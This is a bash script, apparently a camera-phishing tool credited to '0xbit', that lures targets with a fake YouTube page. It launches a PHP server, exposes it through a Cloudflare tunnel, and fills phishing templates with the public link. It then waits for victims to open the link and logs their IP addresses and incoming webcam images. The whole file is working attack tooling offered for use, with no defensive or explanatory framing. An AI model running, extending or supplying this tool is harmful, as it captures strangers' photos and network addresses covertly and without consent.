#!/bin/bash
#coded by 0xbit

trap 'printf "\n";stop' 2

banner() {
	clear
	printf "\e[1;92m ██████████   ██████████ ██████████    █████████  ██████████   █████████    \e[0m\n"
	printf "\e[1;92m ░░███░░░░███ ░░███░░░░░█░░███░░░░███  ███░░░░░███░░███░░░░░█  ███░░░░░███  \e[0m\n"
	printf "\e[1;92m  ░███   ░░███ ░███  █ ░  ░███   ░░███░███    ░░░  ░███  █ ░  ███     ░░░   \e[0m\n"
	printf "\e[1;92m  ░███     █  Get a selfie using Social Engineering █ 0XBIT                 \e[0m\n"
	printf "\e[1;92m  ░███    ░███ ░███░░█    ░███    ░███ ░░░░░░░░███ ░███░░█   ░███           \e[0m\n"
	printf "\e[1;92m  ░███    ███ YOUTUBE   █ ░███    ███ CLOUDFLARE █ ░███ ░   █░░███     ███  \e[0m\n"
	printf "\e[1;92m  ██████████   ██████████ ██████████  ░░█████████  ██████████ ░░█████████   \e[0m\n"
	printf "\e[1;92m ░░░░░░░░░░   ░░░░░░░░░░ ░░░░░░░░░░    ░░░░░░░░░  ░░░░░░░░░░   ░░░░░░░░░    \e[0m\n"
	 
	 }

stop() {
	
	checkngrok=$(ps aux | grep -o "cloudflared" | head -n1)
	checkphp=$(ps aux | grep -o "php" | head -n1)
	
	if [[ $checkngrok == *'cloudflared'* ]]; then
	pkill -f -2 cloudflared > /dev/null 2>&1
	killall -2 cloudflared > /dev/null 2>&1
	fi
	
	if [[ $checkphp == *'php'* ]]; then
	killall -2 php > /dev/null 2>&1
	fi
	exit 1
	
	}

catch_ip() {
	
	ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
	
	cat ip.txt >> saved.ip.txt
	
	
	}

checkfound() {
	
	printf "\n"
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
	while [ true ]; do
	
	
	if [[ -e "ip.txt" ]]; then
	printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
	catch_ip
	rm -rf ip.txt
	
	fi
	
	sleep 0.5
	
	if [[ -e "Log.log" ]]; then
	printf "\n\e[1;92m[\e[0m+\e[1;92m] image file received!\e[0m\n"
	rm -rf Log.log
	fi
	sleep 0.5
	
	done 
	
	}

payload_ngrok() {
	
	link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".link.log")
	sed 's+forwarding_link+'$link'+g' template.php > index.php
	if [[ $option_tem -eq 1 ]]; then
	sed 's+forwarding_link+'$link'+g' youtube.html > index3.html
	sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
	fi
	rm -rf index3.html
	
	}

select_template() {    
	default_option_template="1"
	read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ENTER \e[0m' option_tem
	option_tem="${option_tem:-${default_option_template}}"
	if [[ $option_tem -eq 1 ]]; then
	printf "\n[+]Example: https://www.youtube.com/watch?v=dQw4w9WgXcQ  ID: dQw4w9WgXcQ [+]\n"
	read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
	else
	printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
	sleep 1
	select_template
	fi

	}

ngrok_server() {
	printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
	php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
	sleep 2
	printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflare server...\n"
	rm .link.log >> /dev/null 2>&1 &
	./cloudflared tunnel -url 127.0.0.1:8080 --logfile .link.log > /dev/null 2>&1 &
	sleep 10
	
	link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".link.log")
	if [[ -z "$link" ]]; then
	printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
	printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m cloudflare is already running, run this command killall cloudflared\n"
	printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
	exit 1
	else
	printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
	fi
	payload_ngrok
	checkfound
	}

camphish() {
	if [[ -e sendlink ]]; then
	rm -rf sendlink
	fi
	select_template
	ngrok_server
	}


payload() {
	if [[ $option_tem -eq 1 ]]; then
	sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
	sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
	fi
	rm -rf index3.html
	
	}
banner
camphish
ngrok_server
payload_ngrok
payload
checkfound


